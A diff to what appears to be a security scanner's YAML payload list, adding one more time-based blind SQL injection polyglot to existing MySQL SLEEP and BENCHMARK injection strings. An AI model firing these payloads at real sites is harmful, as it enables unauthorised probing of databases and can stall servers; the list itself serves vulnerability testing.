@@ -43,6 +43,8 @@ payloads:
   - >-
     /**/ AND IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(240))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(240)))OR'|\"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),​SLEEP(240)))OR\"*/
   - >-
+    if(now()=sysdate(),sleep(240),0)/*'XOR(if(now()=sysdate(),sleep(240),0))OR'\"XOR(if(now()=sysdate(),sleep(240),0))OR\"*/
+  - >-
     'IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(240))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(240)))OR'|\"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),​SLEEP(240)))OR\"*/
   - >-
     /**/ AND if(now()=sysdate(),sleep(240),0)/*'XOR(if(now()=sysdate(),sleep(240),0))OR'\"XOR(if(now()=sysdate(),sleep(240),0))OR\"*/
